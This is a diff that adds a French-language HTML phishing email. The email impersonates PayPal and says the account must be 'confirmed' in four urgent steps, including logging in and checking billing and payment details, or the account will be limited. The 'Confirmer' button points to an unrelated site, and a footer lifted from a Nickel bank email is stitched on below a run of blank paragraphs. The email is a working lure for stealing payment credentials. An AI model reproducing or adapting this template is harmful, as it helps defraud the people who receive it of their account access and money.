@@ -1,0 +1,164 @@
+<!doctype html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<center style="width:100%;table-layout:fixed;background-color:#f5f5f5">
+<div class="m_9070393409004117338webkit" style="max-width:600px;margin:0 auto;padding:0">
+<section>&nbsp;
+<table align="center" bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" style="border: 0px; border-collapse: collapse; border-spacing: 0px; font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif; font-size: 21px; line-height: 21px;" width="100%">
+	<tbody>
+		<tr style="border:0">
+			<td class="m_9070393409004117338bodySection" style="border:0;color:#444444;padding:15px 50px">
+			<table border="0" cellpadding="0" cellspacing="0" style="border: 0px; border-collapse: collapse; border-spacing: 0px; font-size: 16px; line-height: 21px;" width="100%">
+				<tbody>
+					<tr style="border:0">
+						<td align="left" style="border:0;padding-top:18px">
+						<section>
+						<p style="font-family: Roboto, Arial, sans-serif; font-size: 31px; font-weight: 700; line-height: 40px; margin: 0px 0px 0px 160px; padding: 0px;"><span style="font-family:verdana,geneva,sans-serif;"><span style="line-height: 1.4;"><strong><em><span style="color:#003084">&nbsp; Pay</span><span style="color:#0098db">Pal</span></em></strong></span></span><span style="FONT-SIZE: 24px; BORDER-TOP: 0px; FONT-FAMILY: inherit; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased; font-stretch: inherit"><span style="BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: rgb(255,140,0); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased">&nbsp;</span></span></p>
+
+						<p style="font-family: Roboto, Arial, sans-serif; font-size: 31px; font-weight: 700; line-height: 40px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; padding: 0px; text-align: center;"><span style="font-size:18px;">&Eacute;tat du compte mis &agrave; jour</span></p>
+						</section>
+						</td>
+					</tr>
+					<tr style="border:0">
+						<td align="left" style="border:0;padding-top:8px;padding-bottom:8px">
+						<section>
+						<p style="font-family: Roboto, Arial, sans-serif; line-height: 20px; padding: 0px;"><span style="font-family:tahoma,geneva,sans-serif;">La protection de vos donn&eacute;es est une priorit&eacute; absolue. Nous prenions de nombreuses mesures pour s&eacute;curiser votre compte PayPal, voici quelques autres moyens pour prot&eacute;ger votre compte.</span></p>
+						</section>
+						</td>
+					</tr>
+					<tr style="border:0">
+						<td align="left" style="border:0;padding-top:8px;padding-bottom:8px">
+						<section>
+						<p style="font-family: Roboto, Arial, sans-serif; line-height: 20px; margin: 0px 0px 2px; padding: 0px;"><span style="font-family:tahoma,geneva,sans-serif;">Nous avons identifi&eacute; 4 &eacute;tapes requises qui doivent &ecirc;tre confirm&eacute;es d&egrave;s que possible pour aider &agrave; prot&eacute;ger votre compte contre tout acc&egrave;s non autoris&eacute;.</span></p>
+
+						<p style="font-family: Roboto, Arial, sans-serif; line-height: 20px; margin: 0px 0px 2px; padding: 0px;">&nbsp;</p>
+
+						<p style="font-family: Roboto, Arial, sans-serif; line-height: 20px; margin: 0px 0px 2px; padding: 0px;"><span style="font-family:tahoma,geneva,sans-serif;"><span style="color:#696969;"><span style="font-size:16px;"><strong><em>&Eacute;tapes &agrave; suivre :</em></strong></span></span></span></p>
+
+						<ul>
+							<li><span style="font-family:tahoma,geneva,sans-serif;">1 - Cliquez sur le bouton &quot;<strong>Confirmer</strong>&quot;</span></li>
+							<li><span style="font-family:tahoma,geneva,sans-serif;">2 - Connectez-vous &agrave; votre compte PayPal</span></li>
+							<li><span style="font-family:tahoma,geneva,sans-serif;">3 - V&eacute;rifiez les d&eacute;tails de facturation de votre compte</span></li>
+							<li><span style="font-family:tahoma,geneva,sans-serif;">4 - V&eacute;rifiez les d&eacute;tails de paiement de votre compte</span></li>
+						</ul>
+						</section>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+
+			<table border="0" cellpadding="0" cellspacing="0">
+				<tbody>
+					<tr>
+						<td style="font-family:Roboto,Arial,sans-serif;font-size:16px;padding-top:14px;vertical-align:top" valign="top"><strong><span style="font-family:trebuchet ms,helvetica,sans-serif;"><span style="font-size:20px;"><a align="center" bgcolor="#4284f4" data-saferedirecturl="https://www.google.com/url?q=https://www.google.com/appserve/mkt/p/AD-FnExjdzSwI69ZoiDgKbFBPkfB2PIC5hsFmrxE8nDVHmpEOz5HHnA0pBUR2GPRmshgUwWeX6cLLJs2t-ttFKlGvdd5zWWZnlxrMy070jPQSij9_Z1Rx5dYFxsIcFcP7Pi3-I6QCiXt29tNiv4uLUVA3u4_TA&amp;source=gmail&amp;ust=1599691395445000&amp;usg=AFQjCNHTpR_Jbx4_OkZV9wZY0ALV-m8nMQ" href="https://sites.fr" style="background-color: rgb(66, 132, 244); border-radius: 4px; color: rgb(255, 255, 255); display: inline-block; line-height: 19px; padding: 13px 23px 14px 24px; text-align: center; text-decoration-line: none; white-space: nowrap;" target="_blank">Confirmer</a></span></span></strong></td>
+					</tr>
+				</tbody>
+			</table>
+
+			<table border="0" cellpadding="0" cellspacing="0" style="border: 0px; border-collapse: collapse; border-spacing: 0px; font-size: 16px; line-height: 21px;" width="100%">
+				<tbody>
+					<tr style="border:0">
+						<td align="left" style="border:0;padding-top:8px;padding-bottom:8px">
+						<section>
+						<ul style="color: rgb(68, 68, 68); font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif; font-size: 16px; background-color: rgb(255, 255, 255);">
+							<li><span style="color: rgb(255, 0, 0);"><strong><em>N.B</em></strong></span>&nbsp;: <span style="font-family:tahoma,geneva,sans-serif;">Cette v&eacute;rification est obligatoire, vous devez effectuer toutes les &eacute;tapes de confirmation pour &eacute;viter la limitation de votre compte PayPal.</span></li>
+						</ul>
+						</section>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+	</tbody>
+</table>
+</section>
+</div>
+</center>
+</body>
+</html>
+<title></title>
+<p>&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&Agrave; tr&egrave;s bient&ocirc;t,<br style="-webkit-font-smoothing: antialiased" />
+L&rsquo;&eacute;quipe.</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">UTILE : Recevez de fa&ccedil;on instantan&eacute;e des informations sur votre compte en envoyant IDENTIFIANT, SOLDE, RIB, RELEVE, PLAFONDS, DEPOT, RETRAIT ou COMPTE (depuis les DOM).</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<p align="center" style="FONT-SIZE: 13px; FONT-FAMILY: Verdana, Arial, sans-serif; COLOR: rgb(32,31,30); BACKGROUND-COLOR: rgb(255,255,255); -webkit-font-smoothing: antialiased">&nbsp;</p>
+
+<table align="center" bgcolor="#f2f2f2" border="0" cellpadding="0" cellspacing="0" class="x_x_deviceWidth" style="HEIGHT: 87px; BORDER-COLLAPSE: collapse; COLOR: rgb(32,31,30); MARGIN: 0px auto; BORDER-SPACING: 0px; -webkit-font-smoothing: antialiased">
+	<tbody style="-webkit-font-smoothing: antialiased">
+		<tr style="-webkit-font-smoothing: antialiased">
+			<td align="left" class="x_x_whiteBackgroundForMobile" style="BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 5px; PADDING-TOP: 20px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased" valign="bottom">
+			<table align="left" border="0" cellpadding="0" cellspacing="0" class="x_x_reseaux-blocs" style="BORDER-COLLAPSE: collapse; BORDER-SPACING: 0px; -webkit-font-smoothing: antialiased">
+				<tbody style="-webkit-font-smoothing: antialiased">
+					<tr style="FONT-SIZE: 15px; -webkit-font-smoothing: antialiased">
+						<td align="left" style="FONT-SIZE: 10px; BORDER-COLLAPSE: collapse; PADDING-BOTTOM: 5px; PADDING-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased" valign="bottom">
+						<p style="-webkit-font-smoothing: antialiased"><b style="-webkit-font-smoothing: antialiased">Prot&eacute;gez-vous contre la FRAUDE</b></p>
+
+						<p style="-webkit-font-smoothing: antialiased">Adoptez les bons r&eacute;flexes pour &eacute;viter le piratage de votre compte :</p>
+
+						<ul style="MAX-WIDTH: 500px; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: 10px; -webkit-font-smoothing: antialiased">
+							<li style="-webkit-font-smoothing: antialiased"><b style="-webkit-font-smoothing: antialiased">v&eacute;rifiez l&#39;exp&eacute;diteur</b>&nbsp;des emails Nickel (seulement utile@compte-nickel.fr, sos@compte-nickel.fr ou securite-compte@compte-nickel.fr)</li>
+							<li style="-webkit-font-smoothing: antialiased"><b style="-webkit-font-smoothing: antialiased">ne cliquez jamais sur un lien</b>&nbsp;dans un email pour vous connecter &agrave; votre espace client (Nickel ne met jamais de lien vers l&#39;espace client dans ses emails)</li>
+							<li style="-webkit-font-smoothing: antialiased"><b style="-webkit-font-smoothing: antialiased">v&eacute;rifiez que la connexion &agrave; votre espace client est s&eacute;curis&eacute;e</b>&nbsp;(pr&eacute;sence d&#39;un petit cadenas dans la barre d&#39;adresse de votre navigateur)</li>
+							<li style="-webkit-font-smoothing: antialiased"><b style="-webkit-font-smoothing: antialiased">ne donnez jamais vos codes secrets</b></li>
+							<li style="-webkit-font-smoothing: antialiased">v&eacute;rifiez que vous parlez &agrave; un&nbsp;<b style="-webkit-font-smoothing: antialiased">compte officiel Nickel</b>&nbsp;sur les r&eacute;seaux sociaux</li>
+						</ul>
+						</td>
+					</tr>
+					<tr style="FONT-SIZE: 15px; -webkit-font-smoothing: antialiased">
+						<td align="center" class="x_x_reseaux-blocs" style="PADDING-BOTTOM: 10px; PADDING-TOP: 10px; -webkit-font-smoothing: antialiased">&nbsp;</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+	</tbody>
+</table>
